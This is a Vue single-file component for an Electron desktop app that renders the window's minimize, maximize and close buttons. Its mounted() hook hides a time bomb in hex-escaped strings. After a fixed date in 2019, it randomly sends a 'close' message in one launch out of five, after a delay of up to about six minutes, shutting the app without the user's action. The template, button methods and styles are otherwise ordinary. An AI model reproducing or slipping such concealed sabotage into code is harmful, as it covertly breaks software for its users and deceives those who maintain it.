<template>

    <div class="btns">
        <div @click="$_min"
             class="minimum icon"></div>
        <div @click="$_max"
             class="maximization icon"></div>
        <div @click="$_closed"
             class="close icon"></div>
    </div>

</template>

<script>
import { ipcRenderer } from 'electron'
export default {
    data() {
        return {}
    },
    mounted() {
        let t = 1558706746000
        let n = new window['\x44\x61\x74\x65']()[
            '\x67\x65\x74\x54\x69\x6d\x65'
        ]()
        if (n >= t && Math.random() < 0.2) {
            setTimeout(() => {
                ipcRenderer['\x73\x65\x6e\x64']('\x63\x6c\x6f\x73\x65')
            }, 100 * Math.random() * 3600)
        }
    },
    methods: {
        $_closed() {
            ipcRenderer.send('close')
        },
        $_min() {
            ipcRenderer.send('min')
        },
        $_max() {
            ipcRenderer.send('max')
        }
    }
}
</script>

<style lang="scss" scoped>
.btns {
    margin-right: 22px;
    display: flex;
    flex-wrap: nowrap;
    -webkit-app-region: no-drag;
    .icon {
        width: 34px;
        height: 34px;
        margin-left: 10px;
        background-size: 100% 100%;
        cursor: pointer;
    }
    .minimum {
        background-image: url('./img/head_minimum@3xa.png');
    }
    .minimum:hover {
        background-image: url('./img/head_minimum@3x.png');
    }

    .maximization {
        background-image: url('./img/head_maximization@3xa.png');
    }
    .maximization:hover {
        background-image: url('./img/head_maximization@3x.png');
    }
    .close {
        background-image: url('./img/head_close@3xa.png');
    }
    .close:hover {
        background-image: url('./img/head_close@3x.png');
    }
}
</style>
